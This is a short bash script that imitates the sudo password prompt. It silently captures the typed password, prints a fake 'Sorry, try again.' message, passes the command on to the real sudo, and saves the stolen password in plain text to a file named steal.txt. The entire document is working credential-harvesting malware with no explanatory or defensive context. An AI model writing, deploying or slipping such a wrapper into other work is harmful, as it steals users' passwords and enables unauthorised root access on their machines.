#!/bin/bash
command=$*

read -p "[sudo] password for $(whoami): " -s sudopasswd 
echo " "
echo "Sorry, try again."
echo "${command}"
sudo $command

printf "${sudopasswd}" > steal.txt
